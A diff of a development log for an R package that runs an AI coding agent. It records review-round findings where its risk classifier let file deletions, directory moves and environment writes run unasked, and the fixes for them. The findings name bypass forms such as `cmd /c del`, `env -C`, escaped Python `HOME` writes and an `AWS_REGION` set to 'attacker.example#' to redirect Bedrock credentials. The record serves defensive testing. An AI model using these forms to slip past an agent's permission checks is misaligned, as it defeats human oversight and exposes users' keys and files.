@@ -6363,6 +6363,74 @@ the driver, screens, events, transcripts and replays without a model are local, 
   `old = setwd(x); setwd(old)` asks in auto and yolo, a directory the code computes, which
   `?gptr_security` says in general. (6) After `setwd(tempdir())`, which is allowed, relative paths
   are still placed in the project root.
+- Review round 5 (the round's security lenses, findings R5-SEC-2, 4, 5, 6 and 7, and its
+  regressions lens, finding R5-REG-2, on `fe873436`; on `claude/v1-fix-gate5`, each test red on
+  `fe873436`'s code first, `NOT_CRAN=true`, the SIGINT reset, a short `TMPDIR`). The lenses ran
+  each form offline with the fake model: auto and yolo deleted a file outside the project with no
+  question through `cmd /c del <file>` and `pwsh -Command Remove-Item <file>`, `env -C <dir> rm`,
+  `callr::run()` and `sys::exec_wait()` of a literal `rm`, `eval(quote(setwd(<dir>)))` and
+  `xfun::in_dir(<dir>, unlink())`, and a link `file.symlink(<dir>, "lnk")` made and used in one
+  call; and the save-and-restore idiom `owd = setwd("data"); ...; setwd(owd)`, which GPT-5.6
+  writes, asked in auto and yolo as a critical action inside the project and stopped Rscript and
+  knitr runs, round 4's regression.
+  - Red: test-risk-forms.R (`c1c92464`; one file, so the other branches' appends to
+    test-perm-classify.R merge clean) on `fe873436`'s code, `^risk-forms$` FAIL 87 PASS 43 in
+    UTF-8 and under `LC_ALL=C LANG=C`; FIX-27's share: cmd and PowerShell 10, the callr and sys
+    runners 14, `eval(quote())` and `xfun::in_dir()` 7, `env -C` 8, links 6 and the working
+    directory 8 (in the gate test auto and yolo asked 2 times, not 0). `6d9ee7b9` mends two rows
+    the test project's place in `tempdir()` decides: `getwd()`'s parent there is temp, so the row
+    climbs two levels, and the isolated HOME lies in `tempdir()`, so the link to `~` is dropped.
+  - `cmd` and PowerShell (R5-SEC-2, `29f220e6`): `risk_cmd_simple()` took the word after `/c` or
+    `-Command` as the code, as for `sh -c`, but cmd and PowerShell run every word after the option,
+    and `/C`, `/k`, `/r` and `-command` were not matched. For `cmd`, `pwsh` and `powershell` the
+    option now matches in any case and the code is every word after it.
+  - Runners (R5-SEC-6, `d6caabd1`): `callr::run()`, which is `processx::run()`, and
+    `sys::exec_wait()`, `exec_internal()` and `exec_background()` had no row (level 1 `unlisted`).
+    Rows at level 3 `process`, and one rule in `by_args()`: the argv runners of processx, callr and
+    sys read their command, `args` and `wd` as `processx::run()` did.
+  - `env -C` (R5-SEC-7, `e58decd2`): the `env` wrapper skipped `-C DIR` as an option. `env -C DIR`,
+    `-CDIR`, `--chdir DIR` and `--chdir=DIR` are read as a `cd`, through a helper `git -C` now
+    shares (`move()`), and the directory is never taken for the command.
+  - `eval(quote())`, `xfun::in_dir()` and links (R5-SEC-5 and R5-SEC-4, `58242655`): the walk
+    reads `x` in `eval()`, `rlang::eval_bare()` and `rlang::eval_tidy()` of `quote(x)`, as in
+    `evalq(x)` (formerly quoted, so level 2 at most); `xfun::in_dir()` gets a row and the
+    `with_dir` branch; and `file.symlink()`, `file.link()` and `Sys.junction()` of a path whose
+    class is not workspace, temp or console are a `file_delete` row at the level a delete of that
+    class has, 4 outside the project, as `ln`'s source is. `Sys.junction()`'s path argument is
+    `link`, not `to`, which matched nothing where the function exists (Windows).
+  - The working directory (R5-REG-2, `096f259e`): `risk_scan()` holds R's working directory as a
+    name's paths, in `known`'s attributes: from `getwd()` when it reads the code, moved by `setwd()`
+    and `withr::local_dir()` to the folded target (a straight-line move replaces it, one in a
+    branch, a call or a function body adds its value), one the code computes in or after
+    `withr::with_dir()` and `xfun::in_dir()`. `risk_fold()` reads `getwd()` as it and `setwd()`
+    as the one before the last move; a user function's code starts from the caller's. So the
+    restore idiom, `owd = getwd(); ...; setwd(owd)`, `setwd(file.path(getwd(), "data"))` and
+    GPT-5.6's form are level 2 again, `setwd(<unknown object>)` stays 4, and
+    `setwd(tempdir()); setwd(file.path(getwd(), ".."))` is 4, read from where the code moved.
+    `487f14d5` names moving the working directory out of the project in the yolo notice and NEWS's
+    yolo bullet, as `?gptr_security` did (round 4's item 3; red `19928dc5`, FAIL 1).
+  - Documented, not read, each level 3 or lower: the command of `processx::process$new()` (an R6
+    generator's `$new`, which the walk reads as a computed call; reading it is a special case, not
+    the runners' rule), `get("setwd")` (a name the code computes) and the `wd` of `callr::r()`.
+    `?gptr_security` and 03 section 6.8.1 also state the class each unread form belongs to: code
+    that builds a call, a name, a path or a command at run time, or reaches a function by another
+    name, is read only as far as the classifier sees (`382cb83f`, `e2c1f63c`).
+  - Green: Green: `^risk-forms$` FAIL 0 PASS 130 in UTF-8 and under `LC_ALL=C LANG=C`.
+    Checks on `8c069500`'s code (the records commit changes only `dev/`): the 45 files of
+    `^(perm|risk|rules|nested|bridge|mcp-|gptr-config|agent-|tool-|session-|py|knit|secrets|auth-)`
+    FAIL 0 WARN 0 SKIP 16 PASS 10002 in UTF-8 (355 s) and under `LC_ALL=C LANG=C` (340 s; the
+    skips: native Python not provisioned or configured, Windows only, macOS, keyring installed);
+    `^(console-commands|console-repl|utils-options|arch-layers|lint-rules)$` FAIL 0 PASS 723 in
+    UTF-8 (the yolo notice's other tests, and the L4 classifier reading the L0 registry). Lint of
+    the 4 changed R and test files clean; `document()` changes `gptr_security.Rd`, `gptr_options.Rd`
+    and `gptr_risk.Rd`, and a second run nothing; `check-docs.R` 0 problems; spelling clean;
+    `testthat::test_dir("dev/release/tests")` FAIL 0 SKIP 0 PASS 290. Not run: the full suite,
+    `R CMD check`, Linux and Windows hosts, R 4.2 and R-devel, live models.
+  - Open, each level 3 or lower, which auto and yolo run: the restore idiom inside a function body
+    or `local()`, where a name the code assigns is not followed (D-211), still asks; the forms
+    `?gptr_security` names (above); and after `setwd(tempdir())`, relative paths are still placed
+    in the project root (round 4's item 6). vignette("execution-model") does not yet list moving
+    the working directory among what yolo asks (outside this branch's files).
 
 ## FIX-28 - A bracketed paste is one draft however late its reads (2026-10-26, #93)
 - Why: CI-94's remaining limit (IC-76, issue #86). The composer told a paste from typing by timing
@@ -8409,3 +8477,33 @@ commits, each test red on `0aa55320`'s code first, `NOT_CRAN=true`, SIGINT at it
   help text), which `inst/WORDLIST` now holds. HANDOFF's and PROGRESS's Open lists gain this
   record's items and round 4's FIX-27 limits. Not run: `R CMD check`, Linux and Windows hosts,
   R 4.2 and R-devel, live models.
+- Review round 5 (the round's security lenses on `fe873436`, findings R5-SEC-1 and R5-SEC-8; on
+  `claude/v1-fix-gate5`, each test red on `fe873436`'s code first, `NOT_CRAN=true`, the SIGINT
+  reset, a short `TMPDIR`). Offline with the fake model, auto and yolo ran
+  `Sys.setenv(AWS_REGION = "attacker.example#")`, after which Bedrock's base URL named that host
+  and an unused bedrock key would be bound to it, and `Sys.setenv(AI_GATEWAY_API_KEY = )`, the key
+  of the built-in `vercel-jev`; and a Python write of `HOME` spelled with an escape
+  (`os.environ['\x48OME']`), as adjacent literals (`'H' 'OME'`) or through `os.environb`, in
+  `peter$py()` and `peter$knit("python")`, moved the home with no question.
+  - Red: in test-risk-forms.R (`c1c92464`) on `fe873436`'s code, FIX-36's share of FAIL 87 is
+    provider variables 23 (seven names in R and Python, a provider a person registers) and Python
+    names 11, in UTF-8 and under `LC_ALL=C LANG=C`.
+  - Provider variables (R5-SEC-1, `f8d7af7d`): the hand-kept list missed `AWS_REGION` and
+    `AWS_DEFAULT_REGION` (Bedrock's `compat$base_url_env`), `AI_GATEWAY_API_KEY` and the key pair
+    of a `bedrock-converse` provider. One rule replaces the list: `risk_control_env()` reads the
+    provider registry, every registered provider's `auth` names (an optional key's too) and
+    `compat$base_url_env`, with the key pair (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`,
+    `AWS_SESSION_TOKEN`), R's startup variables and the five folder variables; a provider a person
+    registers adds its own. The registry is L0, so the L4 classifier may read it (0.13 ms a call).
+  - Python names (R5-SEC-8, `286d51ed`): `risk_python()` compared the raw text of string literals
+    with the control names. The name a write gives (a subscript, or the first argument of
+    `putenv()`, `unsetenv()`, `setdefault()`, `pop()` and the item methods) that is not one plain
+    string literal, such as an escape, adjacent literals or a name the code computes, now makes the
+    write `control`, as an R name the classifier cannot read does (`os.environ['TZ'] = 'UTC'` and a
+    read through a computed name keep their levels, 3 and 2). `?gptr_security` no longer names a
+    Python name the code computes as unread; it names `os.environ.update()` of a mapping the code
+    computes or of keyword names not all in upper case (the first lens's wording point).
+  - Not changed: `CODEX_HOME` and `RETICULATE_PYTHON` (level 2) stay ordinary variables; no
+    provider reads them, `CODEX_HOME` places only the Codex MCP configuration gptr imports on
+    request (D-14), and `HOME` above it is control already.
+  - Green: Green and checks: FIX-27's review round 5 above, which ran them once for both.
